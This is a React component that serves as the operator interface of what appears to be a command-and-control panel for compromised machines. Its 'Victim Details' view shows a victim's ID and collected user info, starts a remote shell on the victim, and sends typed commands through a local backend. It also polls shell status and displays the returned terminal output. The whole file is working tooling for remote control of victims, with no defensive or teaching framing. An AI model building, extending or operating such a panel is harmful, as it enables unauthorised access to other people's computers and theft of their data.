import React, { useEffect, useState, useRef } from "react";
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "./ui/card";
import { Button } from "./ui/button";
import { Input } from "./ui/input";

interface Client {
  client_id: number;
  addr: string;
  userinfo: string;
  shell_active: boolean;
}

interface LogEntry {
  timestamp: string;
  level: "info" | "warning" | "error";
  message: string;
}

interface VictimDetailsProps {
  client: Client;
}

const VictimDetails: React.FC<VictimDetailsProps> = ({ client }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [command, setCommand] = useState("");
  const [sending, setSending] = useState(false);
  const [feedback, setFeedback] = useState("");
  const [shellReady, setShellReady] = useState(client.shell_active);
  const [loadingLogs, setLoadingLogs] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);
  const [userScrolling, setUserScrolling] = useState(false);
  const commandInputRef = useRef<HTMLInputElement>(null);

  const fetchLogs = () => {
    setLoadingLogs(true);
    fetch(`http://localhost:5000/api/logs/${client.client_id}`)
      .then(res => res.json())
      .then(data => {
        setLogs(data.logs);
        setLoadingLogs(false);
      });
  };

  // Fetch logs once on mount or when client changes
  useEffect(() => {
    fetchLogs();
    // eslint-disable-next-line
  }, [client.client_id]);

  // Poll shell ready
  useEffect(() => {
    let interval: NodeJS.Timeout;
    const checkShell = () => {
      fetch(`http://localhost:5000/api/shell_ready/${client.client_id}`)
        .then(res => res.json())
        .then(data => setShellReady(data.ready));
    };
    checkShell();
    interval = setInterval(checkShell, 1000);
    return () => clearInterval(interval);
  }, [client.client_id]);

  const sendCommand = async () => {
    setSending(true);
    setFeedback("");
    try {
      let cmdToSend = command.endsWith("\n") ? command : command + "\n";
      const res = await fetch("http://localhost:5000/api/send_command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          client_id: client.client_id,
          command: cmdToSend,
        }),
      });
      const data = await res.json();
      setFeedback(data.result);
      setCommand("");
      fetchLogs();
      // Refocus the input after sending
      if (commandInputRef.current) commandInputRef.current.focus();
    } catch (e) {
      setFeedback("Failed to send command");
    } finally {
      setSending(false);
    }
  };

  const startShell = async () => {
    setFeedback("");
    try {
      await fetch("http://localhost:5000/api/send_command", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          client_id: client.client_id,
          command: "start_shell",
        }),
      });
      setFeedback("Shell starting...");
      fetchLogs(); // Fetch logs after starting shell
    } catch (e) {
      setFeedback("Failed to start shell");
    }
  };

  // Scroll handler
  const handleScroll = () => {
    const el = terminalRef.current;
    if (!el) return;
    const threshold = 50;
    setUserScrolling(
      el.scrollTop + el.clientHeight < el.scrollHeight - threshold
    );
  };

  useEffect(() => {
    const el = terminalRef.current;
    if (!el) return;
    el.addEventListener("scroll", handleScroll);
    return () => {
      el.removeEventListener("scroll", handleScroll);
    };
  }, []);

  useEffect(() => {
    const el = terminalRef.current;
    if (!el || userScrolling) return;
    el.scrollTop = el.scrollHeight;
  }, [logs, userScrolling]);

  return (
    <Card className="mb-6">
      <CardHeader>
        <CardTitle>Victim Details: ID {client.client_id}</CardTitle>
        <CardDescription>
          <div className="mb-2">
            <strong>User Info:</strong>
            <pre className="bg-muted border rounded p-2 whitespace-pre-wrap">{client.userinfo}</pre>
          </div>
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="mb-4">
          <Button
            size="sm"
            variant="default"
            className="mr-2"
            onClick={startShell}
            disabled={shellReady}
          >
            {shellReady ? "Shell Active" : "Activate Shell"}
          </Button>
        </div>
        <div className="mb-2 flex justify-end">
          <Button size="sm" variant="outline" onClick={fetchLogs}>
            Refresh
          </Button>
        </div>
        <div className="mb-4">
          <h4 className="font-semibold mb-2">Live Terminal Output</h4>
          <div
            ref={terminalRef}
            className="bg-black text-green-400 font-mono text-sm p-4 rounded-md h-[300px] overflow-y-auto"
          >
            {!loadingLogs && (logs.length === 0 ? (
              <div>No logs for this client.</div>
            ) : (
              logs.map((log, idx) => (
                <div key={idx} className="mb-1">
                  <span className="text-gray-400">[{log.timestamp}]</span>{" "}
                  <span className={
                    log.level === "error"
                      ? "text-red-400"
                      : log.level === "warning"
                      ? "text-yellow-400"
                      : "text-green-400"
                  }>
                    [{log.level.toUpperCase()}]
                  </span>{" "}
                  {log.message}
                </div>
              ))
            ))}
          </div>
        </div>
        <div className="flex gap-2 mb-4">
          <Input
            ref={commandInputRef}
            type="text"
            value={command}
            onChange={e => setCommand(e.target.value)}
            placeholder="Enter command"
            disabled={!shellReady || sending}
            className="mr-2"
            onKeyDown={e => {
              if (
                e.key === "Enter" &&
                command.trim() &&
                shellReady &&
                !sending
              ) {
                e.preventDefault();
                sendCommand();
              }
            }}
          />
          <Button
            size="sm"
            variant="outline"
            onClick={sendCommand}
            disabled={!command || !shellReady || sending}
          >
            {sending ? "Sending..." : "Send"}
          </Button>
        </div>
        {feedback && <div className="text-xs mt-1 mb-2">{feedback}</div>}
      </CardContent>
    </Card>
  );
};

export default VictimDetails; 